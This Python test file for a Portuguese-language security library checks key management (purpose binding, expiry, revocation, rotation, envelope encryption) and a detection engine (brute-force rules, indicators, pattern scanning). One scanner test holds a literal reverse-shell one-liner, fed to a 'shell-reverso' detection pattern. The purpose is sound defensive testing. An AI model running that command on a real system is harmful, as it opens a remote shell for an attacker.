# -*- coding: utf-8 -*-
"""Arcane.Chaves e Arcane.Deteccao.

As duas peças erram de jeitos opostos, e os testes seguem isso:

  - uma **chave** erra permitindo: a que assina token também decifra
    arquivo, a vencida continua valendo, a rotação perde o passado.
    Quase todo teste aqui cobra a RECUSA.

  - uma **detecção** erra de dois jeitos, e o segundo e pior: ela
    alerta demais (e alguem desliga) ou nao alerta (e o silencio
    parece calmaria). Os testes cobram os dois: que cinco falhas de
    cinco pessoas NAO viram forca bruta, e que uma regra quebrada nao
    faz o motor parar de detectar o resto.
"""

import os
import sys
import time

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from dataforge.stdlib import get_module  # noqa: E402

Ch = get_module("Arcane.Chaves")
D = get_module("Arcane.Deteccao")


def erro_de(nome):
    from dataforge import errors
    return errors.erro_por_nome(nome)


# ═══════════════════════════════════════════════════════════
#  Chaves
# ═══════════════════════════════════════════════════════════

@pytest.fixture
def cofre():
    return Ch["cofre"]()


def test_o_proposito_e_cobrado(cofre):
    """Uma chave por proposito impede que um comprometimento vire
    todos os comprometimentos."""
    k = cofre.gerar("sessao", proposito="assinar")
    assert len(Ch["usar"](k, "assinar")) == 32
    with pytest.raises(erro_de("CryptoKeyError")) as e:
        Ch["usar"](k, "cifrar")
    assert "assinar" in str(e.value) and "cifrar" in str(e.value)


def test_o_proposito_desconhecido_e_recusado_na_criacao(cofre):
    """A lista e FECHADA: `"asinar"` criaria um proposito novo em
    silencio, e a chave nao serviria para nada."""
    with pytest.raises(erro_de("CryptoKeyError")) as e:
        cofre.gerar("x", proposito="asinar")
    assert "assinar" in e.value.nota


def test_a_chave_vencida_nao_e_usada(cofre):
    k = cofre.gerar("curta", proposito="cifrar", prazo=0.001)
    time.sleep(0.01)
    assert k.vencida()
    with pytest.raises(erro_de("CryptoKeyError")):
        Ch["usar"](k, "cifrar")


def test_prazo_zero_e_sem_prazo(cofre):
    """Nem toda chave tem validade; forcar uma faria quem nao precisa
    inventar um numero."""
    k = cofre.gerar("eterna", proposito="cifrar", prazo=0)
    assert k.vencida() is False


def test_a_revogacao_nao_tem_volta(cofre):
    """Uma chave revogada que pudesse ser reativada seria uma pausa, e
    quem a revogou nao pediu isso."""
    k = cofre.gerar("x", proposito="cifrar")
    k.revogar()
    with pytest.raises(erro_de("CryptoKeyError")) as e:
        Ch["usar"](k, "cifrar")
    assert "revogada" in str(e.value)
    assert k.resumo()["impressao"] == "", "o material tem de sumir junto"


def test_o_material_nao_aparece_em_texto(cofre):
    """O vazamento mais comum e alguem imprimir o objeto para depurar."""
    k = cofre.gerar("x", proposito="cifrar")
    material = Ch["usar"](k, "cifrar")
    import base64
    bruto = base64.b64encode(material).decode()
    for forma in (str(k), repr(k), f"{k}"):
        assert bruto[:12] not in forma
        assert k.kid in forma, "o kid identifica sem revelar"


def test_a_chave_nao_vira_chave_de_vault(cofre):
    k = cofre.gerar("x", proposito="cifrar")
    with pytest.raises(erro_de("CryptoKeyError")):
        {k: 1}


def test_a_impressao_identifica_sem_revelar(cofre):
    """E o que duas maquinas comparam para concordar sobre qual chave
    estao usando."""
    a = cofre.gerar("x", proposito="cifrar")
    b = cofre.gerar("y", proposito="cifrar")
    assert a.resumo()["impressao"] != b.resumo()["impressao"]
    assert len(a.resumo()["impressao"]) == 16


# ── Rotacao ─────────────────────────────────────────────────

def test_a_rotacao_aposenta_e_a_antiga_continua_lendo(cofre):
    """Se trocar a chave tornasse ilegivel o que ja foi cifrado,
    ninguem trocaria — e e exatamente o que acontece na pratica."""
    cofre.gerar("mestra", proposito="cifrar")
    envelope = cofre.envelopar("segredo", "mestra")

    nova = cofre.rotacionar("mestra", "cifrar")
    assert cofre.ativa("mestra", "cifrar").kid == nova.kid
    assert cofre.desenvelopar(envelope) == b"segredo", (
        "o dado antigo precisa continuar legivel")


def test_o_dado_carrega_o_kid(cofre):
    """Sem ele, na hora de decifrar nao se sabe qual das cinco chaves
    usar."""
    k = cofre.gerar("mestra", proposito="cifrar")
    envelope = cofre.envelopar("x", "mestra")
    assert envelope["kid"] == k.kid


def test_recifrar_troca_a_chave_sem_tocar_no_dado(cofre):
    cofre.gerar("mestra", proposito="cifrar")
    velho = cofre.envelopar("um terabyte", "mestra")
    nova = cofre.rotacionar("mestra", "cifrar")
    novo = cofre.recifrar(velho, "mestra")
    assert novo["kid"] == nova.kid
    assert cofre.desenvelopar(novo) == b"um terabyte"


def test_o_cofre_poda_as_aposentadas_antigas():
    """Guardar todas para sempre faz o cofre crescer sem fim; guardar
    zero torna ilegivel o que foi cifrado ontem."""
    c = Ch["cofre"]({"manter": 2})
    for _ in range(6):
        c.gerar("r", proposito="cifrar")
    a = c.auditar()
    assert a["ativas"] == 1
    assert a["aposentadas"] == 2


def test_precisa_rotacionar_avisa_antes(cofre):
    """Uma chave que vence sem ninguem saber derruba o sistema numa
    madrugada."""
    cofre.gerar("curta", proposito="cifrar", prazo=3600)
    cofre.gerar("longa", proposito="cifrar", prazo=99999999)
    perto = [c["rotulo"] for c in cofre.precisa_rotacionar(aviso=7200)]
    assert perto == ["curta"]


def test_por_kid_acha_a_aposentada_e_recusa_a_desconhecida(cofre):
    k = cofre.gerar("m", proposito="cifrar")
    cofre.rotacionar("m", "cifrar")
    assert cofre.por_kid(k.kid).estado == "aposentada"
    with pytest.raises(erro_de("CryptoKeyError")):
        cofre.por_kid("nao-existe")


def test_ativa_sem_chave_diz_o_que_fazer(cofre):
    with pytest.raises(erro_de("CryptoKeyError")) as e:
        cofre.ativa("nunca-criada", "cifrar")
    assert "gerar" in e.value.dica


# ── Envelope ────────────────────────────────────────────────

def test_o_envelope_fecha_e_abre(cofre):
    cofre.gerar("mestra", proposito="cifrar")
    envelope = cofre.envelopar("dado secreto", "mestra")
    assert "dado secreto" not in str(envelope)
    assert cofre.desenvelopar(envelope) == b"dado secreto"


def test_o_envelope_adulterado_e_recusado(cofre):
    """A etiqueta do AEAD e o que transforma "texto ilegivel" em
    RECUSA."""
    cofre.gerar("mestra", proposito="cifrar")
    envelope = cofre.envelopar("x" * 40, "mestra")
    mexido = dict(envelope)
    d = mexido["dados"]
    mexido["dados"] = d[:-4] + ("aaaa" if not d.endswith("aaaa") else "bbbb")
    with pytest.raises(Exception):
        cofre.desenvelopar(mexido)


def test_desenvelopar_recusa_o_que_nao_e_envelope(cofre):
    with pytest.raises(erro_de("CryptoKeyError")) as e:
        cofre.desenvelopar({"qualquer": "coisa"})
    assert "envelope" in str(e.value)


def test_cada_envelope_tem_a_propria_dek(cofre):
    """E o ponto do envelope: rotacionar a mestra e recifrar 32 bytes
    por objeto, e nao reescrever os dados."""
    cofre.gerar("mestra", proposito="cifrar")
    a = cofre.envelopar("igual", "mestra")
    b = cofre.envelopar("igual", "mestra")
    assert a["dek"] != b["dek"]
    assert a["dados"] != b["dados"], "o mesmo texto nao pode dar o mesmo cifrado"


# ── Persistencia e derivacao ────────────────────────────────

def test_exportar_e_importar(cofre):
    cofre.gerar("mestra", proposito="cifrar")
    envelope = cofre.envelopar("atravessa", "mestra")
    pacote = cofre.exportar("senha mestra forte")

    outro = Ch["cofre"]()
    assert outro.importar(pacote, "senha mestra forte") >= 1
    assert outro.desenvelopar(envelope) == b"atravessa"


def test_a_senha_errada_nao_abre_o_cofre(cofre):
    cofre.gerar("m", proposito="cifrar")
    pacote = cofre.exportar("certa")
    with pytest.raises(erro_de("CryptoKeyError")) as e:
        Ch["cofre"]().importar(pacote, "errada")
    assert "senha" in str(e.value)


def test_derivar_de_e_estavel_e_por_contexto(cofre):
    """Uma chave por finalidade sem guardar dez chaves."""
    mestra = cofre.gerar("m", proposito="derivar")
    a = Ch["derivar_de"](mestra, "cookies")
    b = Ch["derivar_de"](mestra, "cookies")
    c = Ch["derivar_de"](mestra, "csrf")
    assert a == b, "a mesma entrada da a mesma subchave"
    assert a != c, "contextos diferentes dao subchaves diferentes"
    assert len(a) == 32
    assert Ch["usar"](mestra, "derivar") not in (a, c)


def test_derivar_de_cobra_o_proposito(cofre):
    k = cofre.gerar("m", proposito="cifrar")
    with pytest.raises(erro_de("CryptoKeyError")):
        Ch["derivar_de"](k, "x")


def test_usar_recusa_o_que_nao_e_chave():
    with pytest.raises(erro_de("CryptoKeyError")):
        Ch["usar"]("um texto qualquer", "cifrar")


def test_o_cofre_recusa_opcao_desconhecida():
    from dataforge.stdlib.opcoes import OpcaoDesconhecida
    with pytest.raises(OpcaoDesconhecida):
        Ch["cofre"]({"tamanhoo": 16})


# ═══════════════════════════════════════════════════════════
#  Deteccao
# ═══════════════════════════════════════════════════════════

def test_a_regra_dispara_na_contagem():
    m = D["motor"]()
    m.regra("fb", quando="login.falhou", vezes=5, janela=60.0,
            gravidade="alto", attack="T1110", por="ip")
    for _ in range(4):
        assert m.evento("login.falhou", {"ip": "1.2.3.4"}) == []
    novos = m.evento("login.falhou", {"ip": "1.2.3.4"})
    assert len(novos) == 1
    assert novos[0]["gravidade"] == "alto"
    assert novos[0]["attack"] == "T1110"


def test_a_correlacao_e_POR_CHAVE():
    """Cinco falhas de cinco pessoas diferentes NAO sao forca bruta —
    e o alerta que mais custa e o que esta errado."""
    m = D["motor"]()
    m.regra("fb", quando="login.falhou", vezes=5, janela=60.0, por="ip")
    for i in range(5):
        m.evento("login.falhou", {"ip": f"10.0.0.{i}"})
    assert m.alertas() == []


def test_a_janela_e_DESLIZANTE():
    """5 falhas as 23h59 e 5 as 00h01 passam por baixo de duas janelas
    fixas — e e assim que se contorna um contador por minuto."""
    m = D["motor"]()
    m.regra("fb", quando="x", vezes=3, janela=10.0, por="", suprimir=0)
    base = 1000.0
    m.evento("x", {}, por="k", quando=base)
    m.evento("x", {}, por="k", quando=base + 20)   # a primeira ja saiu
    m.evento("x", {}, por="k", quando=base + 21)
    assert m.alertas() == [], "so 2 dentro da janela"
    m.evento("x", {}, por="k", quando=base + 22)
    assert len(m.alertas()) == 1


def test_a_supressao_evita_o_ruido():
    """A mesma regra disparando mil vezes por minuto e ruido, e ruido
    e o que faz desligar o alerta."""
    m = D["motor"]()
    m.regra("r", quando="x", vezes=1, janela=60.0, suprimir=300.0)
    for _ in range(10):
        m.evento("x", {}, por="mesma")
    assert len(m.alertas()) == 1


def test_a_supressao_e_por_chave():
    m = D["motor"]()
    m.regra("r", quando="x", vezes=1, suprimir=300.0)
    m.evento("x", {}, por="a")
    m.evento("x", {}, por="b")
    assert len(m.alertas()) == 2


def test_o_alerta_traz_os_eventos_que_o_causaram():
    """"Forca bruta detectada" sem o que aconteceu nao e
    investigavel."""
    m = D["motor"]()
    m.regra("fb", quando="login.falhou", vezes=3, por="ip")
    for i in range(3):
        m.evento("login.falhou", {"ip": "9.9.9.9", "tentativa": i})
    a = m.alertas()[0]
    assert len(a["eventos"]) == 3
    assert a["eventos"][0]["dados"]["tentativa"] == 0


def test_a_janela_zera_depois_do_alerta():
    """Sem isso, o sexto evento dispararia de novo, e o setimo tambem."""
    m = D["motor"]()
    m.regra("r", quando="x", vezes=3, suprimir=0)
    for _ in range(5):
        m.evento("x", {}, por="k")
    assert len(m.alertas()) == 1


def test_o_curinga_de_evento_precisa_ser_escrito():
    m = D["motor"]()
    m.regra("r", quando="login.*", vezes=1)
    m.evento("login.falhou", {}, por="k")
    m.evento("logout", {}, por="k")
    assert len(m.alertas()) == 1


def test_a_regra_por_condicao():
    m = D["motor"]()
    m.regra("erro-5xx", onde=lambda e: e["dados"].get("status", 0) >= 500,
            vezes=1, gravidade="medio")
    m.evento("http", {"status": 200}, por="k")
    assert m.alertas() == []
    m.evento("http", {"status": 503}, por="k")
    assert len(m.alertas()) == 1


def test_uma_regra_que_FALHA_nao_derruba_o_motor():
    """Um motor que morre no primeiro erro deixa de detectar tudo o
    resto — e o silencio parece calmaria."""
    m = D["motor"]()
    m.regra("quebrada", onde=lambda e: e["nao_existe"]["x"], vezes=1)
    m.regra("boa", quando="y", vezes=1)
    m.evento("y", {}, por="k")
    assert len(m.alertas()) == 1
    assert len(m.erros()) == 1
    assert m.erros()[0]["regra"] == "quebrada"
    assert m.resumo()["erros_de_regra"] == 1


def test_a_regra_precisa_dizer_o_que_observar():
    m = D["motor"]()
    with pytest.raises(erro_de("SecurityError")) as e:
        m.regra("vazia")
    assert "quando" in e.value.dica


def test_a_gravidade_desconhecida_e_recusada():
    m = D["motor"]()
    with pytest.raises(erro_de("SecurityError")):
        m.regra("r", quando="x", gravidade="urgentissimo")


def test_ao_alertar_recebe_o_alerta():
    recebidos = []
    m = D["motor"]()
    m.ao_alertar(recebidos.append)
    m.regra("r", quando="x", vezes=1)
    m.evento("x", {}, por="k")
    assert len(recebidos) == 1


def test_um_ao_alertar_que_FALHA_nao_perde_o_alerta():
    """O alerta ja esta registrado quando o canal e chamado: se o
    Slack estiver fora do ar, o alerta continua na lista."""
    def explode(_a):
        raise RuntimeError("slack fora do ar")

    m = D["motor"]()
    m.ao_alertar(explode)
    m.regra("r", quando="x", vezes=1)
    m.evento("x", {}, por="k")
    assert len(m.alertas()) == 1
    assert len(m.erros()) == 1


def test_o_filtro_por_gravidade():
    m = D["motor"]()
    m.regra("baixa", quando="a", vezes=1, gravidade="baixo")
    m.regra("alta", quando="b", vezes=1, gravidade="critico")
    m.evento("a", {}, por="k")
    m.evento("b", {}, por="k")
    assert len(m.alertas()) == 2
    assert len(m.alertas(gravidade_minima="alto")) == 1


# ── Indicadores ─────────────────────────────────────────────

def test_o_indicador_tem_prazo():
    """Um IP malicioso hoje e um IP de nuvem reciclado em tres
    semanas; um indicador sem validade vira falso positivo
    permanente."""
    ind = D["indicadores"]()
    ind.acrescentar("ip", "198.51.100.1", prazo=10.0, quando=1000.0)
    assert ind.ver("ip", "198.51.100.1", quando=1005.0) is not None
    assert ind.ver("ip", "198.51.100.1", quando=1011.0) is None


def test_o_indicador_e_normalizado():
    """`MAU.EXEMPLO.` e `mau.exemplo` sao o mesmo dominio; sem isto a
    lista teria duas entradas e a consulta acharia a errada."""
    ind = D["indicadores"]()
    ind.acrescentar("dominio", "MAU.EXEMPLO.")
    ind.acrescentar("hash", "ABCDEF0123")
    assert ind.ver("dominio", "mau.exemplo") is not None
    assert ind.ver("hash", "abcdef0123") is not None
    assert len(ind) == 2


def test_o_tipo_desconhecido_e_recusado():
    ind = D["indicadores"]()
    with pytest.raises(erro_de("SecurityError")):
        ind.acrescentar("telepatia", "x")


def test_limpar_vencidos():
    ind = D["indicadores"]()
    ind.acrescentar("ip", "1.1.1.1", prazo=1.0, quando=1000.0)
    ind.acrescentar("ip", "2.2.2.2", prazo=99999.0, quando=1000.0)
    assert ind.limpar_vencidos(quando=2000.0) == 1
    assert len(ind) == 1


def test_carregar_um_feed():
    ind = D["indicadores"]()
    ind.carregar([{"tipo": "ip", "valor": "3.3.3.3", "gravidade": "alto"},
                  {"tipo": "dominio", "valor": "x.exemplo"}], fonte="feed")
    assert len(ind) == 2
    assert ind.ver("ip", "3.3.3.3")["gravidade"] == "alto"


def test_observar_liga_o_indicador_ao_motor():
    m = D["motor"]()
    m.indicadores().acrescentar("ip", "198.51.100.66", gravidade="critico")
    m.regra("ioc", quando="indicador.visto", vezes=1, gravidade="critico")
    assert m.observar("ip", "198.51.100.66", {"onde": "proxy"}) is not None
    assert m.observar("ip", "8.8.8.8") is None
    assert len(m.alertas(gravidade_minima="critico")) == 1


# ── Padroes e log ───────────────────────────────────────────

def test_o_padrao_acha_e_traz_a_linha():
    regras = [D["padrao"]("shell-reverso", ["bash -i", r"/dev/tcp/"],
                          gravidade="critico")]
    r = D["varrer"]("#!/bin/sh\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n", regras)
    assert len(r) == 1
    assert r[0]["gravidade"] == "critico"
    assert r[0]["total"] == 2
    assert r[0]["achados"][0]["linha"] == 2


def test_o_padrao_aceita_bytes():
    regras = [D["padrao"]("marca", ["MZ"])]
    assert len(D["varrer"](b"MZ\x90\x00", regras)) == 1


def test_o_trecho_do_achado_vem_curto():
    """Um relatorio que despeja o arquivo inteiro nao e lido — e se o
    conteudo for malicioso ele passa a estar em mais um lugar."""
    regras = [D["padrao"]("x", ["alvo"])]
    r = D["varrer"]("alvo" + "y" * 500, regras)
    assert len(r[0]["achados"][0]["trecho"]) <= 60


def test_o_minimo_de_achados():
    regras = [D["padrao"]("x", ["a"])]
    assert D["varrer"]("aaa", regras, minimo=5) == []
    assert len(D["varrer"]("aaaaa", regras, minimo=5)) == 1


def test_um_padrao_que_nao_compila_diz_o_que_fazer():
    with pytest.raises(erro_de("SecurityError")) as e:
        D["padrao"]("x", ["[sem fechar"])
    assert "escapar_regex" in e.value.dica


def test_o_resultado_vem_ordenado_pela_gravidade():
    regras = [D["padrao"]("baixa", ["a"], gravidade="baixo"),
              D["padrao"]("alta", ["a"], gravidade="critico")]
    r = D["varrer"]("a", regras)
    assert [x["regra"] for x in r] == ["alta", "baixa"]


def test_ler_linha_de_log_combinado():
    l = D["ler_linha"](
        '203.0.113.7 - ana [21/Sep/2026:10:00:00 +0000] '
        '"GET /admin HTTP/1.1" 403 128')
    assert l["ip"] == "203.0.113.7"
    assert l["status"] == 403 and isinstance(l["status"], int)
    assert l["caminho"] == "/admin"


def test_ler_linha_devolve_void_no_que_nao_casa():
    assert D["ler_linha"]("qualquer coisa") is None


def test_um_formato_desconhecido_manda_usar_o_regex():
    """Adivinhar o formato seria pior que dizer que nao se conhece."""
    with pytest.raises(erro_de("SecurityError")) as e:
        D["ler_linha"]("x", formato="json")
    assert "Regex" in e.value.dica


# ═══════════════════════════════════════════════════════════
#  Os tres modulos nao se repetem
# ═══════════════════════════════════════════════════════════

#: Os nomes que PODEM se repetir entre modulos, e o motivo.
#:
#: A trava existe para achar a MESMA pergunta respondida duas vezes —
#: e ela ja achou tres: 'politica' (politica de senha contra motor de
#: autorizacao), 'analisar' (regras sobre '.df' contra padroes sobre
#: conteudo) e o proprio 'motor'.
#:
#: Mas 'motor' e diferente dos outros dois: ele nomeia o OBJETO
#: PRINCIPAL do modulo, e ninguem o chama sem o prefixo — 'P.motor' e
#: 'D.motor' sao inequivocos no ponto de uso. Fazer um deles se chamar
#: outra coisa so para satisfazer a trava trocaria um vocabulario
#: consistente por um arbitrario, e a proxima pessoa teria de decorar
#: qual modulo usa qual palavra.
#:
#: A lista e curta e NOMEADA de proposito: uma excecao generica
#: ("ignore colisoes") desligaria a trava inteira.
COLISOES_DELIBERADAS = {
    frozenset({"Politica", "Deteccao"}): {"motor"},
}


def test_nenhum_nome_se_repete_entre_os_modulos_de_seguranca():
    """Duas respostas para a mesma pergunta divergem — e no dia em que
    divergirem sera a de seguranca que estara errada."""
    import itertools

    modulos = {
        "Seguranca": get_module("Arcane.Seguranca"),
        "Politica": get_module("Arcane.Politica"),
        "Chaves": Ch,
        "Deteccao": D,
        "Crypto": get_module("Arcane.Crypto"),
    }
    nomes = {k: set(v) - {"__name__"} for k, v in modulos.items()}
    for a, b in itertools.combinations(nomes, 2):
        permitidos = COLISOES_DELIBERADAS.get(frozenset({a, b}), set())
        comuns = (nomes[a] & nomes[b]) - permitidos
        assert comuns == set(), (
            f"{a} e {b} repetem: {sorted(comuns)}\n"
            "Ou renomeie um dos dois, ou acrescente a COLISOES_DELIBERADAS "
            "com o motivo escrito.")


def test_a_lista_de_colisoes_deliberadas_nao_envelhece():
    """Uma excecao que deixou de ser necessaria e uma excecao que
    esconde a proxima."""
    modulos = {
        "Seguranca": get_module("Arcane.Seguranca"),
        "Politica": get_module("Arcane.Politica"),
        "Chaves": Ch,
        "Deteccao": D,
        "Crypto": get_module("Arcane.Crypto"),
    }
    for par, nomes in COLISOES_DELIBERADAS.items():
        a, b = sorted(par)
        reais = set(modulos[a]) & set(modulos[b])
        sobrando = nomes - reais
        assert not sobrando, (
            f"'{sorted(sobrando)}' esta em COLISOES_DELIBERADAS para "
            f"{a}/{b} e ja nao colide — tire da lista.")
